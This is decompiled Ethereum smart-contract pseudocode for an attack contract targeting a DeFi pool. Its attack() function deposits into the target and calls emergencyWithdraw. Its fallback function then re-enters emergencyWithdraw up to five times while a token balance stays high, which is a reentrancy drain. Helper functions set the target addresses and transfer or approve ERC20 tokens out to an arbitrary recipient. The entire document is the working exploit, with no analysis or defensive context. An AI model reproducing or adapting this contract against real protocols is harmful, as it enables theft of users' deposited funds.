contract main {




// =====================  Runtime code  =====================


address stor0;
address stor1;
address stor2;

function sub_07c6dd52(?) {
    require calldata.size - 4 >= 32
    stor2 = arg1
}

function sub_0b439621(?) {
    require calldata.size - 4 >= 32
    stor0 = arg1
}

function setToken(address arg1) {
    require calldata.size - 4 >= 32
    stor1 = arg1
}

function withdrawERC20(address arg1, uint256 arg2, address arg3) {
    require calldata.size - 4 >= 96
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args address(arg3), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function approveERC20(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require ext_code.size(arg1)
    call arg1.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args address(arg2), arg3
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function attack() payable {
    require ext_code.size(stor0)
    call stor0.deposit(uint256 arg1, uint256 arg2) with:
         gas gas_remaining wei
        args 0, 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(stor0)
    call stor0.emergencyWithdraw(uint256 arg1) with:
         gas gas_remaining wei
        args 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    idx = 0
    while idx < 5:
        mem[100] = stor2
        require ext_code.size(stor1)
        staticcall stor1.0x70a08231 with:
                gas gas_remaining wei
               args stor2
        mem[96] = ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        if ext_call.return_data[0] < 10^18:
            idx = idx
            continue 
        mem[96] = 0x5312ea8e00000000000000000000000000000000000000000000000000000000
        mem[100] = 0
        require ext_code.size(stor0)
        call stor0.emergencyWithdraw(uint256 arg1) with:
             gas gas_remaining wei
            args 0
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        idx = idx + 1
        continue 
}



}
